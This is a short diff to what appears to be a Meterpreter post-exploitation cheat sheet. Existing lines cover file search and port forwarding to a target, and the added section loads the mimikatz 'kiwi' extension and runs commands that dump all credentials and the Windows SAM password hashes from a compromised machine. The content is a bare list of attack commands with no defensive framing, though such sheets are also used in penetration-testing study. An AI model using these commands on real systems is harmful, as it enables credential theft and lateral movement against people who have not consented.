@@ -21,3 +21,8 @@ search -f <FILE>*.<EXTENSION> <PATH>\\
 # port forward
 portfwd add –l <LOCAL_PORT> –p <REMOTE_PORT> –r  <TARGET_IP>
 curl http://127.0.0.1:<LOCAL_PORT>
+
+# mimikatz
+load kiwi
+creds_all
+lsa_dump_sam
